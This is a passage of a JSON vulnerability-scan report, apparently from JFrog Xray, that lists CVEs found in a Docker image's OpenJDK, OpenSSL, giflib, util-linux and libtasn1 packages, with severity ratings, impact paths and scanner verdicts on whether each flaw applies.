                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21830",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-646815",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4, 23; Oracle GraalVM for JDK: 17.0.12, 21.0.4, 23; Oracle GraalVM Enterprise Edition: 20.3.15 and  21.3.11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4, 23; Oracle GraalVM for JDK: 17.0.12, 21.0.4, 23; Oracle GraalVM Enterprise Edition: 20.3.15 and  21.3.11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21217",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-10-18T00:00:00.041Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21217",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-230458",
                    "summary": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
                    "description": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-2097",
                            "cwe": [
                                "CWE-327"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                        }
                    ],
                    "created": "2022-07-06T00:00:00.095Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "Improper implementation of the AES encryption in OpenSSL may cause data leakage.",
                        "full_description": "[`OpenSSL's`](https://openssl.org) implementation for `Advanced Encryption Standard (AES)` in `Offset CodeBook mode (OCB)` used for block ciphers may neglect to encrypt some of the data. This issue only affects 32bit x86 platforms, and could result in either exposing 16 bytes of preexisting data in the program's memory, or 16 bytes of plaintext when performing \"in place\" encryption.\n\nTLS and DTLS are not affected, since OpenSSL doesn't support OCB based cipher suites for these communication methods.\n\nA program is vulnerable if it uses any of the AES OCB encryption methods, `EVP_aes_128_ocb`, `EVP_aes_192_ocb` or `EVP_aes_256_ocb`, when EVP encryption is initialized. For instance:\n\n```\nEVP_EncryptInit_ex(ctx, EVP_aes_256_ocb(), NULL, key, iv);\nEVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);\n```",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "Use of OCB mode is uncommon and does not affect TLS and DTLS",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "This vulnerability only applies to 32bit x86 platforms using in-place AES encryption in OCB mode",
                                "is_positive": true
                            },
                            {
                                "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                                "is_positive": false
                            },
                            {
                                "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                                "description": "Data that should have been encrypted will be exposed in the case of \"in place\" encryption, whereas in other cases unknown preexisting data from the memory may be exposed",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-2097",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if the vulnerable function <code>EVP_EncryptInit_ex</code> is called.</p>\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: the system's architecture is 32bit / x86.</p>",
                            "evidence": null,
                            "info": "The vulnerable function EVP_EncryptInit_ex is never called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-2097",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if the vulnerable function <code>EVP_EncryptInit_ex</code> is called.</p>\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: the system's architecture is 32bit / x86.</p>",
                            "evidence": null,
                            "info": "The vulnerable function EVP_EncryptInit_ex is never called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-2097",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-2097",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-209039",
                    "summary": "There is a heap-buffer-overflow in GIFLIB 5.2.1 function DumpScreen2RGB() in gif2rgb.c:298:45.",
                    "description": "There is a heap-buffer-overflow in GIFLIB 5.2.1 function DumpScreen2RGB() in gif2rgb.c:298:45.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-28506",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2022-04-26T00:00:00.444Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:giflib:5.1.9-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:giflib:5.1.9-r0",
                            "cve_id": "CVE-2022-28506",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>gif2rgb</code> utility exists and if it is executed in a script.</p>",
                            "evidence": null,
                            "info": "Gif2Rgb's binary or usage is not found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:giflib:5.1.9-r0",
                            "vulnerability_id": "CVE-2022-28506",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-594380",
                    "summary": "A memory leak flaw was found in Golang in the RSA encrypting/decrypting code, which might lead to a resource exhaustion vulnerability using attacker-controlled inputs​. The memory leak happens in github.com/golang-fips/openssl/openssl/rsa.go#L113. The objects leaked are pkey​ and ctx​. That function uses named return parameters to free pkey​ and ctx​ if there is an error initializing the context or setting the different properties. All return statements related to error cases follow the \"return nil, nil, fail(...)\" pattern, meaning that pkey​ and ctx​ will be nil inside the deferred function that should free them.",
                    "description": "A memory leak flaw was found in Golang in the RSA encrypting/decrypting code, which might lead to a resource exhaustion vulnerability using attacker-controlled inputs​. The memory leak happens in github.com/golang-fips/openssl/openssl/rsa.go#L113. The objects leaked are pkey​ and ctx​. That function uses named return parameters to free pkey​ and ctx​ if there is an error initializing the context or setting the different properties. All return statements related to error cases follow the \"return nil, nil, fail(...)\" pattern, meaning that pkey​ and ctx​ will be nil inside the deferred function that should free them.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-1394"
                        }
                    ],
                    "created": "2024-03-21T00:00:00.080Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-1394",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-599310",
                    "summary": "Issue summary: Checking excessively long invalid RSA public keys may take\na long time.\n\nImpact summary: Applications that use the function EVP_PKEY_public_check()\nto check RSA public keys may experience long delays. Where the key that\nis being checked has been obtained from an untrusted source this may lead\nto a Denial of Service.\n\nWhen function EVP_PKEY_public_check() is called on RSA public keys,\na computation is done to confirm that the RSA modulus, n, is composite.\nFor valid RSA keys, n is a product of two or more large primes and this\ncomputation completes quickly. However, if n is an overly large prime,\nthen this computation would take a long time.\n\nAn application that calls EVP_PKEY_public_check() and supplies an RSA key\nobtained from an untrusted source could be vulnerable to a Denial of Service\nattack.\n\nThe function EVP_PKEY_public_check() is not called from other OpenSSL\nfunctions however it is called from the OpenSSL pkey command line\napplication. For that reason that application is also vulnerable if used\nwith the '-pubin' and '-check' options on untrusted data.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
                    "description": "Issue summary: Checking excessively long invalid RSA public keys may take\na long time.\n\nImpact summary: Applications that use the function EVP_PKEY_public_check()\nto check RSA public keys may experience long delays. Where the key that\nis being checked has been obtained from an untrusted source this may lead\nto a Denial of Service.\n\nWhen function EVP_PKEY_public_check() is called on RSA public keys,\na computation is done to confirm that the RSA modulus, n, is composite.\nFor valid RSA keys, n is a product of two or more large primes and this\ncomputation completes quickly. However, if n is an overly large prime,\nthen this computation would take a long time.\n\nAn application that calls EVP_PKEY_public_check() and supplies an RSA key\nobtained from an untrusted source could be vulnerable to a Denial of Service\nattack.\n\nThe function EVP_PKEY_public_check() is not called from other OpenSSL\nfunctions however it is called from the OpenSSL pkey command line\napplication. For that reason that application is also vulnerable if used\nwith the '-pubin' and '-check' options on untrusted data.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-6237"
                        }
                    ],
                    "created": "2024-04-25T00:00:00.198Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-6237",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187940",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35586",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.664Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35586",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-198622",
                    "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
                    "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-0563",
                            "cwe": [
                                "CWE-209"
                            ],
                            "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2022-02-22T00:00:00.118Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libuuid:2.33.2-r0"
                    ],
                    "extended_information": {
                        "short_description": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
                        "full_description": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Partial file data leakage",
                                "is_positive": true
                            },
                            {
                                "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                                "description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                                "is_positive": false
                            }
                        ],
                        "remediation": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them."
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libuuid:2.33.2-r0",
                            "cve_id": "CVE-2022-0563",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>chfs</code> and <code>chfn</code> CLI utilities are compiled with the vulnerable <code>readline</code> library.</p>",
                            "evidence": null,
                            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libuuid:2.33.2-r0",
                            "vulnerability_id": "CVE-2022-0563",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-259759",
                    "summary": "GNU Libtasn1 before 4.19.0 has an ETYPE_OK off-by-one array size check that affects asn1_encode_simple_der.",
                    "description": "GNU Libtasn1 before 4.19.0 has an ETYPE_OK off-by-one array size check that affects asn1_encode_simple_der.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-46848",
                            "cwe": [
                                "CWE-193"
                            ],
                            "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                        }
                    ],
                    "created": "2022-10-25T00:00:00.695Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libtasn1:4.14-r0"
                    ],
                    "extended_information": {
                        "short_description": "An out-of-bounds read in libtasn1 allows an attacker to perform denial of service by using a public exploit.",
                        "full_description": "[GNU libtasn](https://www.gnu.org/software/libtasn1/) is a highly portable C library that provides Abstract Syntax Notation One (ASN.1) parsing, encoding, and decoding functions. It is widely used by network and cryptography packages (e.g. GnuTLS).\nlibtasn1 implementation has an improper input validation of ETYPE, in the `ETYPE_OK` macro function. ETYPE is compared against the actual size of the ETYPE array `_asn1_tags_size` instead of `_asn1_tags_size -1` which leads the validation to pass with ETYPE out of range (when `ETYPE = _asn1_tags_size`).\n\n```\n# define ETYPE_OK(etype) (((etype) != ASN1_ETYPE_INVALID && \\\n                          (etype) <= _asn1_tags_size && \\\n                          _asn1_tags[(etype)].desc != NULL)?1:0)\n```\n\nAn attacker can exploit this issue by providing the `_asn1_tags_size` value as the ETYPE value to `ETYPE_OK`, through multiple libtasn1 APIs (as demonstrated in the public exploit). Providing this ETYPE value causes a global buffer overflow (reads 8 bytes outside of a global array) and leads to denial of service in most cases.\n\nThe official solution fixes the bug by comparing ETYPE with `_asn1_tags_size -1` as following:\n```\n(etype) < _asn1_tags_size\n```",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Exploiting this issue in a server process can cause denial-of-service when it crashes.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue has an exploit published",
                                "description": "A published proof-of-concept is available for this issue.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                                "is_positive": false
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "In order to exploit this issue an attacker must be able to provide the ETYPE value to the `ETYPE_OK` macro, or at least manipulate it through multiple libtasn1 APIs.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libtasn1:4.14-r0",
                            "cve_id": "CVE-2021-46848",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the following vulnerable functions are called:</p>\n<ul>\n<li>\n<p><code>asn1_encode_simple_der</code></p>\n</li>\n<li>\n<p><code>asn1_decode_simple_der</code></p>\n</li>\n<li>\n<p><code>asn1_decode_simple_ber</code></p>\n</li>\n<li>\n<p><code>asn1_der_decoding2</code></p>\n</li>\n<li>\n<p><code>asn1_der_decoding</code></p>\n</li>\n<li>\n<p><code>asn1_der_decoding_element</code></p>\n</li>\n<li>\n<p><code>asn1_der_decoding_startEnd</code></p>\n</li>\n<li>\n<p><code>asn1_expand_any_defined_by</code></p>\n</li>\n<li>\n<p><code>asn1_expand_octet_string</code></p>\n</li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libtasn1:4.14-r0",
                            "vulnerability_id": "CVE-2021-46848",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-412602",
